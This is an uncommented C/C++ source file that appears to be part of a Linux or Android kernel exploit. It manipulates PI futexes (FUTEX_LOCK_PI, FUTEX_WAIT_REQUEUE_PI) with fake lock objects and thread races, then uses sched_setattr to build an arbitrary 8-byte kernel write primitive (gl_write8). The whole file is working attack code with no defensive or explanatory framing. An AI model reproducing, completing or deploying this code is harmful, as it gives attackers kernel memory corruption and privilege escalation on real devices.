#include "common.h"

#define GL_OWNER_NAME "w0"
#define GL_CONS_NAME "w1"
#define GL_WAIT_NAME "w2"

static uint32_t *u32_at(uint64_t addr)
{
    return (uint32_t *)(uintptr_t)addr;
}

void *gl_thread_c(void *arg)
{
    (void)arg;
    cpu_set_t set;
    struct timespec ts;

    prctl(PR_SET_NAME, GL_WAIT_NAME, 0, 0, 0);

    CPU_ZERO(&set);
    CPU_SET(2, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0)
        _exit(2);

    g_t1_tid.store(gl_get_tid(), std::memory_order_release);

    errno = 0;
    (void)gl_futex_call(u32_at((uint64_t)&g_lock_fake_a), GL_FUTEX_LOCK_PI, 0,
                        NULL, NULL, 0);

    g_t1_entered.store(1, std::memory_order_release);

    gl_yield_spin_flag(&g_lock_owner_done, 1);

    gl_yield_spin_flag(&g_owner_blocked, 1);
    usleep(500000);

    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += GL_WAITER_BLOCK_SEC;
    if (ts.tv_nsec >= 1000000000) {
        ts.tv_sec++;
        ts.tv_nsec -= 1000000000;
    }

    g_t1_ready.store(1, std::memory_order_release);

    errno = 0;
    (void)gl_futex_call(u32_at((uint64_t)&g_lock_target),
                        GL_FUTEX_WAIT_REQUEUE_PI, 0,
                        (const struct gl_timespec *)&ts,
                        u32_at((uint64_t)&g_lock_chain), 0);

    gl_yield_spin_flag(&g_route_done, 1);

    for (;;) {
        if (g_drain_go.load(std::memory_order_acquire) != 0) {
            g_drain_go.store(0, std::memory_order_release);
            errno = 0;
            (void)gl_futex_call(u32_at((uint64_t)&g_lock_fake_a),
                                GL_FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

            g_drain_unlock_done.store(1, std::memory_order_release);
        }

        if (g_rearm_go.load(std::memory_order_acquire) != 0) {
            g_rearm_go.store(0, std::memory_order_release);
            g_t1_ready.store(1, std::memory_order_release);

            clock_gettime(CLOCK_MONOTONIC, &ts);
            ts.tv_sec += GL_WAITER_BLOCK_SEC;
            if (ts.tv_nsec >= 1000000000) {
                ts.tv_sec++;
                ts.tv_nsec -= 1000000000;
            }

            errno = 0;
            (void)gl_futex_call(u32_at((uint64_t)&g_lock_target),
                                GL_FUTEX_WAIT_REQUEUE_PI, 0,
                                (const struct gl_timespec *)&ts,
                                u32_at((uint64_t)&g_lock_chain), 0);

            g_rearm_done.store(1, std::memory_order_release);
        }

        if (g_w_go.load(std::memory_order_acquire) != 0) {
            gl_fdset_arm();
            g_w_done.store(1, std::memory_order_release);
            g_w_go.store(0, std::memory_order_release);
        }

        __asm__ volatile("yield" ::: "memory");
    }
}

void *gl_thread_a(void *arg)
{
    long r;

    (void)arg;
    prctl(PR_SET_NAME, GL_OWNER_NAME, 0, 0, 0);

    gl_yield_spin_flag(&g_t1_entered, 1);

    errno = 0;
    r = gl_futex_call(u32_at((uint64_t)&g_lock_chain), GL_FUTEX_LOCK_PI, 0,
                      NULL, NULL, 0);

    g_lock_owner_done.store(1, std::memory_order_release);

    g_chain_released.store(1, std::memory_order_release);

    g_owner_blocked.store(1, std::memory_order_release);
    errno = 0;
    r = gl_futex_call(u32_at((uint64_t)&g_lock_fake_a), GL_FUTEX_LOCK_PI, 0,
                      NULL, NULL, 0);

    g_drain_ret.store((int)r, std::memory_order_release);
    g_drain_done.store(1, std::memory_order_release);

    for (;;)
        sched_yield();
}

void *gl_thread_b(void *arg)
{
    (void)arg;
    prctl(PR_SET_NAME, GL_CONS_NAME, 0, 0, 0);
    for (;;)
        pause();
}

#define GL_FAKE_LOCK_STRIDE 0x20

#define GL_FAKE_LOCK_REGION 0x100
#define GL_FAKE_LOCK_REGIONS 15

#define GL_FAKE_LOCK_REGION_BASE 0x100

static uint64_t s_fake_lock_slot;

static unsigned s_attr_toggle;

uint64_t gl_fake_lock_region_offset(void)
{
    return GL_FAKE_LOCK_REGION_BASE +
           (uint64_t)(getpid() % GL_FAKE_LOCK_REGIONS) * GL_FAKE_LOCK_REGION;
}

static uint64_t gl_next_fake_lock(void)
{
    return g_fake_lock + (s_fake_lock_slot++) * GL_FAKE_LOCK_STRIDE;
}

static int gl_write8_once(uint64_t target, uint64_t value)
{
    struct gl_sched_attr attr;
    int rc;

    if (g_t1_tid.load(std::memory_order_acquire) == 0)
        return -1;

    if (g_cycle_fresh.load(std::memory_order_acquire) == 0) {
        if (gl_cycle_rearm() != 0)
            return -1;
    }

    g_w_target = target;
    g_w_value = value;
    g_w_lock = gl_next_fake_lock();
    g_w_done.store(0, std::memory_order_release);
    g_w_go.store(1, std::memory_order_release);

    rc = gl_wait_flag(&g_w_done, 1, GL_ROUTE_WAIT_SEC * GL_MS_PER_SEC);
    if (rc != 0)
        return -1;

    memset(&attr, 0, sizeof(attr));
    attr.size = GL_SCHED_ATTR_SIZE;
    attr.sched_policy = GL_SCHED_BATCH;
    attr.sched_nice = (s_attr_toggle++ & 1) ? 19 : 18;

    errno = 0;
    rc = (int)gl_sched_setattr(
        (pid_t)g_t1_tid.load(std::memory_order_acquire), &attr, 0);

    if (rc != 0)
        return -1;

    g_cycle_fresh.store(0, std::memory_order_release);
    return 0;
}

int gl_write8(uint64_t target, uint64_t value)
{
    for (int i = 0; i < GL_KWRITE_ATTEMPTS; i++) {
        if (gl_write8_once(target, value) == 0)
            return 0;
    }
    return -1;
}

int gl_write8_until(uint64_t target, uint64_t value, gl_verify_fn verify)
{
    for (int i = 0; i < GL_KWRITE_ATTEMPTS; i++) {
        (void)gl_write8_once(target, value);

        if (verify && verify())
            return 0;
    }

    return -1;
}
